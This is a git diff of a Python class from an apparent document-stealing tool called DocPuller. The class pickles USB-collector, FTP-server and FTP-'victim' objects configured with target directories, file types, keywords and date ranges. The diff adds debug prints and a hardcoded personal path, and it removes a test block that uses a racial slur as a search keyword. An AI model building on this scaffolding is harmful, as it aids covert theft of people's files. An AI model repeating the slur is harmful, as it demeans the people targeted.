@@ -22,8 +22,9 @@ class FrozenObjectGeneartor:
     def __create_docpuller_usb(self):
         obj = DocPullerUSB(self.direcoties, self.file_type, self.keywords, self.date)
 
-        with open('DocPullerObjecets/frozen_DocPullerUSB.pkl', 'wb') as file:
-            dill.dump(obj, file)
+        with open(r'C:\Users\ibena\Documents\GitHub\DocPuller\Generator\DocPullerObjecets\frozen_DocPullerUSB.pkl', 'wb') as file:
+            print('opend file')
+            pickle.dump(obj, file)
 
     def __create_docpuller_ftp_server(self):
         obj = Server(self.server_ip, self.server_port)
@@ -38,14 +39,9 @@ class FrozenObjectGeneartor:
             dill.dump(obj, file)
 
     def main(self):
+        print('genariting frozen objects')
         if self.is_usb:
             self.__create_docpuller_usb()
         else:
             self.__create_docpuller_ftp_server()
             self.__create_docpuller_ftp_victim()
-
-
-if __name__ == '__main__':
-    asdf = FrozenObjectGeneartor(True, ('Desktop',), ('.pdf', '.doc'),
-                                 (datetime.date(2020, 1, 1), datetime.date(2023, 1, 1)), ('nigger',))
-    asdf.main()
